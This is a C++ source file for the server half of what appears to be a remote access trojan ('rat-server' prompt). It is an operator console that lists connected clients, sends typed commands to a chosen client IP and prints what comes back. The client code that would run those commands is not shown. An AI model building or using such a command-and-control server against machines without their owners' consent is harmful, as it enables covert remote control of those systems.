#include "Server.hpp"

Server* Server::getInstance() {
  if (pServerInstance == nullptr) {
    pServerInstance = new Server();
  }
  return pServerInstance;
}

int Server::init(std::string __sServerIpv4Addresss, int __iServerPort) {
  sServerIpv4Address = __sServerIpv4Addresss;
  iServerPort = __iServerPort;
  pss = new ServerSocket(sServerIpv4Address, iServerPort);
  int iResult = pss->openSocket();
  if (iResult) {
    return iResult;
  }
  logEvent("Server started", LOG_TYPE_INFO);

  return 0;
}

int Server::loop() {
  while (1) {
    std::cout << "rat-server>> ";
    std::vector<std::string> vsCmd;
    std::string sCmdLn;
    std::string sCmd;
    getline(std::cin, sCmdLn);
    std::istringstream issCmdLn(sCmdLn);
    while (issCmdLn >> sCmd) {
      vsCmd.push_back(sCmd);
    }
    if (vsCmd.size() == 1 && vsCmd.front() == "quit") {
      break;
    }
    if (vsCmd.size() == 1 && vsCmd.front() == "clients") {
      std::vector<std::string> vRes = pss->getClientsAddress();
      if (vRes.empty()) {
        std::cout << "No active client\n";
      } else {
        for (auto s : vRes) {
          std::cout << s << "\n";
        }
      }
      continue;
    }
    std::string sAddr = vsCmd.back();
    vsCmd.pop_back();

    sCmd = "";
    for (std::string str : vsCmd) {
      sCmd += str;
      sCmd += " ";
    }

    std::string sRes = "";
    command(sCmd, sAddr, &sRes);
    std::cout << sRes << "\n";
  }

  return 0;
}

int Server::stop() {
  pss->closeSocket();
  logEvent("Server stopped", LOG_TYPE_INFO);
  return 0;
}

Server* Server::pServerInstance = nullptr;

Server::Server() { setLogDir("/tmp/rat/server.log"); }

Server::~Server() {}

int Server::command(std::string sCmd, std::string sIpv4Addr,
                    std::string* psRes) {
  return pss->sendMsgWithReply(sIpv4Addr, sCmd, psRes);
}